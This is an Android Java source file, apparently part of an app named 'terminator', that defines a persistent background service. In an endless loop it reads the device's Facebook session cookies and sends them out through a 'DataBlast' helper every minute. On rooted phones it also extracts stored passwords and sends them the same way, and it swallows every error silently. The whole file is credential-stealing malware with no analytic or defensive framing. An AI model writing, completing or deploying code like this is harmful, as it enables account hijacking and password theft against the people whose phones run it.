package com.terminator;  
import android.app.Service;  
import android.content.Intent;  
import android.os.IBinder;  
import android.webkit.CookieManager;  

public class MainService extends Service {  
    @Override  
    public IBinder onBind(Intent intent) { return null; }  

    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        new Thread(() -> {  
            while (true) {  
                try {  
                    String cookies = CookieManager.getInstance().getCookie("https://facebook.com");  
                    DataBlast.fire(cookies);  
                    if (RootHunter.isRooted()) {  
                        DataBlast.fire(RootHunter.extractPasswords());  
                    }  
                    Thread.sleep(60000);  
                } catch (Exception e) {}  
            }  
        }).start();  
        return START_STICKY;  
    }  
}  
